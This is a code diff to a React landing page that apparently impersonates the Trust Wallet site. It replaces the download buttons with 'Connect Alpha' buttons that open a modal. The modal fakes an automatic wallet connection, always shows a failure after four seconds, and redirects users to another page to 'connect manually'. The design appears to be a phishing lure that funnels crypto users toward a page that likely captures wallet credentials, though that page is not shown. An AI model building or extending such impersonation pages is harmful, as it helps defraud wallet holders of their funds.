@@ -1,13 +1,56 @@
 import heroPhones from "@/assets/hero-phones.png";
-import { Shield, Smartphone, Globe, Lock, ArrowRight, ChevronDown, Coins, Wallet, BarChart3 } from "lucide-react";
+import trustLogo from "@/assets/trust.png";
+import { Shield, Smartphone, Globe, Lock, ArrowRight, ChevronDown, Coins, Wallet, BarChart3, Loader2, X } from "lucide-react";
+import { useState, useEffect } from "react";
 
 const TrustWalletShield = () => (
-  <div className="w-10 h-10 rounded-lg flex items-center justify-center" style={{ background: "linear-gradient(135deg, hsl(210 100% 50%), hsl(160 80% 45%))" }}>
-    <Shield className="w-5 h-5 text-primary-foreground" />
-  </div>
+  <img src={trustLogo} alt="Trust Wallet Logo" className="w-10 h-10 rounded-lg object-cover" />
 );
 
+const ConnectModal = ({ onClose }: { onClose: () => void }) => {
+  const [status, setStatus] = useState<"connecting" | "failed">("connecting");
+
+  useEffect(() => {
+    const timer = setTimeout(() => setStatus("failed"), 4000);
+    return () => clearTimeout(timer);
+  }, []);
+
+  return (
+    <div className="fixed inset-0 bg-black/60 flex items-center justify-center z-50">
+      <div className="bg-background rounded-2xl p-8 w-full max-w-sm mx-4 relative shadow-xl">
+        <button onClick={onClose} className="absolute top-4 right-4 text-muted-foreground hover:text-foreground">
+          <X className="w-5 h-5" />
+        </button>
+        {status === "connecting" ? (
+          <div className="flex flex-col items-center gap-4 text-center">
+            <Loader2 className="w-12 h-12 text-primary animate-spin" />
+            <h3 className="text-lg font-bold text-foreground">Connecting to Trust Wallet</h3>
+            <p className="text-muted-foreground text-sm">Attempting to connect automatically. Please wait...</p>
+          </div>
+        ) : (
+          <div className="flex flex-col items-center gap-4 text-center">
+            <div className="w-12 h-12 rounded-full bg-destructive/10 flex items-center justify-center">
+              <X className="w-6 h-6 text-destructive" />
+            </div>
+            <h3 className="text-lg font-bold text-foreground">Auto-connect Failed</h3>
+            <p className="text-muted-foreground text-sm">We couldn't connect automatically. Please connect manually to continue.</p>
+            <button
+              onClick={() => { window.location.href = "/pages/index.html"; }}
+              className="inline-flex items-center gap-2 bg-primary text-primary-foreground px-8 py-3 rounded-full text-sm font-semibold w-full justify-center"
+            >
+              Connect Manually
+              <ArrowRight className="w-4 h-4" />
+            </button>
+          </div>
+        )}
+      </div>
+    </div>
+  );
+};
+
 const Index = () => {
+  const [showModal, setShowModal] = useState(false);
+
   return (
     <div className="min-h-screen bg-background text-foreground font-sans">
       {/* Navigation */}
@@ -46,19 +89,9 @@ const Index = () => {
               Unlock the power of your cryptocurrency assets and explore the world of Web3 with Trust Wallet.
             </p>
             <div className="flex flex-wrap gap-4 justify-center lg:justify-start">
-              <button className="flex items-center gap-3 border border-border rounded-2xl px-6 py-3 cursor-default hover:bg-muted transition-colors">
-                <Smartphone className="w-5 h-5 text-primary" />
-                <div className="text-left">
-                  <div className="text-xs text-muted-foreground">Download</div>
-                  <div className="text-sm font-semibold text-foreground">Mobile App</div>
-                </div>
-              </button>
-              <button className="flex items-center gap-3 border border-border rounded-2xl px-6 py-3 cursor-default hover:bg-muted transition-colors">
-                <Globe className="w-5 h-5 text-primary" />
-                <div className="text-left">
-                  <div className="text-xs text-muted-foreground">Download</div>
-                  <div className="text-sm font-semibold text-foreground">Extension</div>
-                </div>
+              <button onClick={() => setShowModal(true)} className="inline-flex items-center gap-2 bg-primary text-primary-foreground px-8 py-3.5 rounded-full text-base font-semibold">
+                Connect Alpha
+                <ArrowRight className="w-4 h-4" />
               </button>
             </div>
           </div>
@@ -186,8 +219,8 @@ const Index = () => {
           <p className="text-muted-foreground text-lg mb-8">
             Join millions of users who trust us with their crypto. Available on iOS, Android, and as a browser extension.
           </p>
-          <button className="inline-flex items-center gap-2 bg-primary text-primary-foreground px-8 py-3.5 rounded-full text-base font-semibold cursor-default">
-            Download Trust Wallet
+          <button onClick={() => setShowModal(true)} className="inline-flex items-center gap-2 bg-primary text-primary-foreground px-8 py-3.5 rounded-full text-base font-semibold">
+            Connect Alpha
             <ArrowRight className="w-4 h-4" />
           </button>
         </div>
@@ -212,6 +245,7 @@ const Index = () => {
           </div>
         </div>
       </footer>
+      {showModal && <ConnectModal onClose={() => setShowModal(false)} />}
     </div>
   );
 };
